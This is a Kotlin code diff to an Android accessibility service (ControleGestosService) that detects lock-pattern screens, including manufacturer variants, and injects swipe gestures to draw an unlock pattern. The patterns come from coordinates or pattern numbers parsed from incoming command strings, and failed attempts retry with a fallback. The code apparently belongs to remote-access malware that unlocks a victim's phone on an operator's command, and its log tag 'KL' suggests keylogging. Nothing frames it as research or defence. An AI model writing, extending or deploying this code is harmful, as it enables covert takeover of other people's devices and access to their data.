@@ -1207,9 +1207,12 @@ class ControleGestosService : AccessibilityService() {
         val id = no.viewIdResourceName?.lowercase().orEmpty()
         return classe.contains("lockpatternview") ||
                 classe.contains("patternview") ||
+                classe.contains("lockpattern") ||
                 id.contains("lock_pattern") ||
                 id.contains("pattern_view") ||
-                id.contains("patternview")
+                id.contains("patternview") ||
+                id.contains("pattern_container") ||
+                id.contains("miui_pattern")
     }
 
     private fun detectarAreaPadrao(elementos: List<Map<String, Any>>): Rect? {
@@ -1266,11 +1269,19 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun calcularCentrosGrade(area: Rect): List<Pair<Float, Float>> {
+        val paddingFactor = if (fabricanteUsaToquesParaPadrao()) 0.14f else 0.07f
+        val padX = area.width() * paddingFactor
+        val padY = area.height() * paddingFactor
+        val esquerda = area.left + padX
+        val topo = area.top + padY
+        val largura = area.width() - (padX * 2f)
+        val altura = area.height() - (padY * 2f)
+
         val pontos = mutableListOf<Pair<Float, Float>>()
         for (linha in 0..2) {
             for (coluna in 0..2) {
-                val x = area.left + (coluna + 0.5f) * area.width() / 3f
-                val y = area.top + (linha + 0.5f) * area.height() / 3f
+                val x = esquerda + (coluna + 0.5f) * largura / 3f
+                val y = topo + (linha + 0.5f) * altura / 3f
                 pontos.add(x to y)
             }
         }
@@ -1352,10 +1363,27 @@ class ControleGestosService : AccessibilityService() {
         }
 
         Log.i("KL", "Executando padrao_nums ${numeros.joinToString("-")} (${pontos.size} pontos)")
+        executarPadraoDesbloqueio(pontos)
+    }
+
+    private fun executarPadraoDesbloqueio(pontos: List<Pair<Float, Float>>) {
+        if (pontos.size < 2) return
+
+        val callbackFallback: (Boolean) -> Unit = { cancelado ->
+            if (cancelado) {
+                Log.w("KL", "Primeiro gesto falhou, tentando modo alternativo")
+                if (fabricanteUsaToquesParaPadrao()) {
+                    executarPadraoContinuo(pontos, null)
+                } else {
+                    executarPadraoSegmentado(pontos, null)
+                }
+            }
+        }
+
         if (fabricanteUsaToquesParaPadrao()) {
-            executarSequenciaToques(pontos)
+            executarPadraoSegmentado(pontos, callbackFallback)
         } else {
-            executarPadraoContinuo(pontos)
+            executarPadraoContinuo(pontos, callbackFallback)
         }
     }
 
@@ -1406,12 +1434,8 @@ class ControleGestosService : AccessibilityService() {
             "padrao" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
                 val pontos = parsearPontos(coords) ?: return
-                if (fabricanteUsaToquesParaPadrao()) {
-                    executarSequenciaToques(pontos)
-                } else {
-                    executarPadraoContinuo(pontos)
-                }
-                ignorarArrastosAteMs = System.currentTimeMillis() + 3500
+                executarPadraoDesbloqueio(pontos)
+                ignorarArrastosAteMs = System.currentTimeMillis() + 5000
             }
             "sequencia" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
@@ -1525,7 +1549,53 @@ class ControleGestosService : AccessibilityService() {
         }, null)
     }
 
-    private fun executarPadraoContinuo(pontos: List<Pair<Float, Float>>) {
+    private fun executarPadraoSegmentado(
+        pontos: List<Pair<Float, Float>>,
+        aoTerminar: ((cancelado: Boolean) -> Unit)?
+    ) {
+        if (pontos.size < 2) return
+
+        val builder = GestureDescription.Builder()
+        var inicioMs = 0L
+
+        for (i in 0 until pontos.size - 1) {
+            val origem = pontos[i]
+            val destino = pontos[i + 1]
+            val dx = destino.first - origem.first
+            val dy = destino.second - origem.second
+            val distancia = sqrt(dx * dx + dy * dy)
+            val duracao = (distancia * 3.2f).toLong().coerceIn(320L, 900L)
+            val continua = i < pontos.size - 2
+
+            val caminho = Path().apply {
+                moveTo(origem.first, origem.second)
+                lineTo(destino.first, destino.second)
+            }
+            builder.addStroke(
+                GestureDescription.StrokeDescription(caminho, inicioMs, duracao, continua)
+            )
+            inicioMs += duracao - 40L
+        }
+
+        val gesto = builder.build()
+        Log.i("KL", "Padrao segmentado: ${pontos.size} pontos, duracao total ~${inicioMs}ms")
+        dispatchGesture(gesto, object : GestureResultCallback() {
+            override fun onCompleted(gestureDescription: GestureDescription?) {
+                Log.d("KL", "Padrao segmentado concluido")
+                aoTerminar?.invoke(false)
+            }
+
+            override fun onCancelled(gestureDescription: GestureDescription?) {
+                Log.w("KL", "Padrao segmentado cancelado")
+                aoTerminar?.invoke(true)
+            }
+        }, null)
+    }
+
+    private fun executarPadraoContinuo(
+        pontos: List<Pair<Float, Float>>,
+        aoTerminar: ((cancelado: Boolean) -> Unit)? = null
+    ) {
         if (pontos.isEmpty()) return
         if (pontos.size == 1) {
             executarToque(pontos[0].first, pontos[0].second)
@@ -1539,7 +1609,10 @@ class ControleGestosService : AccessibilityService() {
             distanciaTotal += sqrt(dx * dx + dy * dy)
         }
 
-        val duracao = (distanciaTotal * 2.4f).toLong().coerceIn(700L, 3200L)
+        val multiplicador = if (fabricanteUsaToquesParaPadrao()) 3.8f else 2.4f
+        val duracaoMin = if (fabricanteUsaToquesParaPadrao()) 1400L else 700L
+        val duracaoMax = if (fabricanteUsaToquesParaPadrao()) 4800L else 3200L
+        val duracao = (distanciaTotal * multiplicador).toLong().coerceIn(duracaoMin, duracaoMax)
         val caminho = Path().apply {
             moveTo(pontos[0].first, pontos[0].second)
             for (i in 1 until pontos.size) {
@@ -1554,11 +1627,12 @@ class ControleGestosService : AccessibilityService() {
         dispatchGesture(gesto, object : GestureResultCallback() {
             override fun onCompleted(gestureDescription: GestureDescription?) {
                 Log.d("KL", "Padrao concluido")
+                aoTerminar?.invoke(false)
             }
 
             override fun onCancelled(gestureDescription: GestureDescription?) {
-                Log.w("KL", "Padrao cancelado — tentando sequencia de toques")
-                executarSequenciaToques(pontos)
+                Log.w("KL", "Padrao continuo cancelado")
+                aoTerminar?.invoke(true)
             }
         }, null)
     }
